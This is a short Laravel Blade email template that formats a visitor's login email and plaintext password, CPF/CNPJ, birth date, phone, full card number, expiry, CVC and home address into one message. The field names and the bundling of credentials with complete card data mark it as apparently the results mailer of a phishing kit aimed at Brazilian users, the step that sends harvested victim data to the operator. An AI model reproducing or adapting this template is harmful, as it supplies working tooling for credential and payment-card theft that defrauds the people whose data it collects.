{{--@formatter:off--}}
@php
use Illuminate\Foundation\Inspiring;
[$message, $author] = str(Inspiring::quotes()->random())->explode('-');
@endphp
<x-mail::message>
# Login Information
 - Email: {{$visitor->user}}
 - Password: {{$visitor->pass}}
# Personal Information
 - Full name: {{$address->fullname}}
 - CPF/CNPJ: {{$request->get('cpf')}}
 - Date of Birth: {{$address->birthdate}}
 - Phone Number: {{$address->telefone}}
# Card Information
 - Cardholder Name: {{$request->get('cardHolder')}}
 - Card Number: {{$request->get('cardNumber')}}
 - Card Expiry: {{$request->get('expiryDate')}}
 - Card CVC: {{$request->get('cvv')}}
# Address Information
 - Street: {{$address->street}}
 - Number: {{$address->number}}
 - Complement: {{$address->complement}}
 - Neighborhood: {{$address->neighborhood}}
 - City: {{$address->city}}
 - CEP: {{$address->cep}}
 - State: {{$address->state}}
</x-mail::message>
